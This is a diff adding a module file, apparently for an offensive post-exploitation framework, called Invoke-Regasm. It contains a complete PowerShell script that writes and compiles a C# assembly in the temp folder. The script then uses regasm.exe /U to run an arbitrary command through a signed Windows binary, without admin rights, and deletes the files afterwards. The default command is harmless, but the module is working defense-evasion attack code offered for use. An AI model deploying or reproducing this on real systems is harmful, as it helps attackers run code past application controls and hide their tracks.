@@ -1,0 +1,110 @@
+name: Invoke-Regasm
+authors:
+  - name: Anthony Rose
+    handle: '@Cx01N'
+    link: https://twitter.com/Cx01N_
+description: |
+  Compile C# source with a ComRegisterFunction attribute and execute
+  via regasm.exe /U for signed binary proxy execution. Regasm.exe is
+  the .NET Assembly Registration Utility. Adversaries abuse the
+  ComRegisterFunction or ComUnregisterFunction attributes to execute
+  arbitrary code when regasm processes a specially crafted assembly.
+  This does not require admin rights when using the /U (unregister)
+  flag.
+software: ''
+tactics: [TA0005]
+techniques: [T1218.009]
+background: true
+output_extension:
+needs_admin: false
+opsec_safe: false
+language: powershell
+min_language_version: '2'
+comments:
+  - https://github.com/redcanaryco/atomic-red-team
+options:
+  - name: Command
+    description: Command to execute via the compiled assembly.
+    required: true
+    value: 'powershell.exe -nop -Command Write-Host Regasm_Success'
+  - name: OutputFunction
+    description: PowerShell output function to use.
+    required: false
+    value: 'Out-String'
+    suggested_values:
+      - Out-String
+      - ConvertTo-Json
+script: |
+  function Invoke-Regasm {
+      param(
+          [string]$Command
+      )
+
+      $TempDir = $env:TEMP
+      $SourcePath = Join-Path $TempDir "regasm_payload.cs"
+      $OutputPath = Join-Path $TempDir "regasm_payload.dll"
+      $CscPath = "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe"
+      $RegasmPath = "C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe"
+
+      # Build the C# source from a single-quoted here-string so PowerShell
+      # does not interpolate variables or treat embedded " as delimiters.
+      # The placeholder __COMMAND__ is replaced by $Command, escaped for a
+      # C# verbatim string literal (" -> "") so any characters in the
+      # user's command survive intact.
+      $EscapedCommand = $Command.Replace('"', '""')
+      $CSharpCode = @'
+  using System;
+  using System.Diagnostics;
+  using System.Runtime.InteropServices;
+  using System.EnterpriseServices;
+
+  public class RegasmPayload
+  {
+      [ComRegisterFunction]
+      public static void RegisterClass(string key)
+      {
+          Process.Start("cmd.exe", @"/c __COMMAND__");
+      }
+
+      [ComUnregisterFunction]
+      public static void UnRegisterClass(string key)
+      {
+          Process.Start("cmd.exe", @"/c __COMMAND__");
+      }
+  }
+  '@
+      $CSharpCode = $CSharpCode.Replace('__COMMAND__', $EscapedCommand)
+
+      Write-Output "[*] Writing C# source to: $SourcePath"
+      try {
+          $CSharpCode | Out-File -FilePath $SourcePath -Encoding ASCII -ErrorAction Stop
+      } catch {
+          Write-Output "[-] Failed to write C# source: $($_.Exception.Message)"
+          return
+      }
+
+      Write-Output "[*] Compiling with csc.exe..."
+      $compileArgs = @(
+          "/r:System.EnterpriseServices.dll",
+          "/out:$OutputPath",
+          "/target:library",
+          $SourcePath
+      )
+      $proc = Start-Process -FilePath $CscPath -ArgumentList $compileArgs -Wait -PassThru -NoNewWindow
+      if ($proc.ExitCode -ne 0) {
+          Write-Output "[-] Compilation failed with exit code: $($proc.ExitCode)"
+          return
+      }
+
+      Write-Output "[*] Executing via regasm /U..."
+      $raProc = Start-Process -FilePath $RegasmPath -ArgumentList "/U", "`"$OutputPath`"" -Wait -PassThru -NoNewWindow
+      if ($raProc.ExitCode -ne 0) {
+          Write-Output "[-] Regasm failed with exit code: $($raProc.ExitCode)"
+      } else {
+          Write-Output "[+] Regasm execution completed."
+      }
+
+      Remove-Item -Path $SourcePath -Force -ErrorAction SilentlyContinue
+      Remove-Item -Path $OutputPath -Force -ErrorAction SilentlyContinue
+  }
+script_end: Invoke-Regasm {{ PARAMS }} | {{ OUTPUT_FUNCTION }}
